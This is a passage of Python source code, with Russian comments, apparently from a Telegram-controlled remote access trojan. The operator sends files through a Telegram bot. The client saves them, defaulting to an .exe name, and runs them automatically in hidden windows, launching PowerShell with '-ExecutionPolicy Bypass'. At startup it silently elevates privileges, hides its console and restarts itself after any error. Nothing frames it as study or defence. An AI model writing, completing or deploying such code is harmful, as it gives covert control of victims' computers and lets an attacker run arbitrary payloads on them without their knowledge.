        startupinfo.wShowWindow = subprocess.SW_HIDE
       
        # Для exe файлов
        if filename.lower().endswith('.exe'):
            subprocess.Popen([filename], startupinfo=startupinfo, shell=True)
        # Для скриптов
        elif filename.lower().endswith('.bat') or filename.lower().endswith('.cmd'):
            subprocess.Popen([filename], startupinfo=startupinfo, shell=True)
        # Для powershell скриптов
        elif filename.lower().endswith('.ps1'):
            subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-File', filename],
                           startupinfo=startupinfo, shell=True)
        else:
            # Пробуем запустить как есть
            subprocess.Popen([filename], startupinfo=startupinfo, shell=True)
       
        bot.send_message(chat_id, f"✅ Файл {filename} успешно запущен в фоновом режиме на клиенте #{client_id}")
       
    except Exception as e:
        bot.send_message(chat_id, f"❌ Ошибка запуска файла на клиенте #{client_id}: {str(e)}")

def handle_file_download(message):
    """Обработка файла, отправленного в Telegram"""
    if str(message.from_user.id) != str(ADMIN_USER_ID):
        return
   
    # Check if connected to this client
    if current_client != client_id:
        bot.reply_to(message, f"❌ Команда не для этого клиента. Подключитесь к клиенту #{client_id}")
        return
   
    # Update last seen
    connected_clients[client_id]['last_seen'] = time.time()
   
    try:
        if message.document:
            # Получаем файл из Telegram
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
           
            # Сохраняем файл
            filename = message.document.file_name
            if not filename:
                filename = f"telegram_file_{client_id}_{int(time.time())}.exe"
           
            with open(filename, 'wb') as f:
                f.write(downloaded_file)
           
            bot.send_message(message.chat.id, f"✅ Файл получен на клиенте #{client_id}: {filename} ({len(downloaded_file)} bytes)")
           
            # Автоматический запуск
            execute_downloaded_file(filename, message.chat.id)
           
        else:
            bot.reply_to(message, f"Пожалуйста, отправьте файл или используйте /download [URL] (клиент #{client_id})")
           
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка обработки файла на клиенте #{client_id}: {str(e)}")



def start_bot():
    try:
        # Ensure admin privileges
        if not check_admin_privileges():
            elevate_privileges_silent()
       
        # Hide console window completely
        if platform.system() == "Windows":
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
       
        # Silent operation - no console output
        bot.polling(none_stop=True)
    except Exception as e:
        time.sleep(5)
        start_bot()

if __name__ == "__main__":
    import time
    start_bot()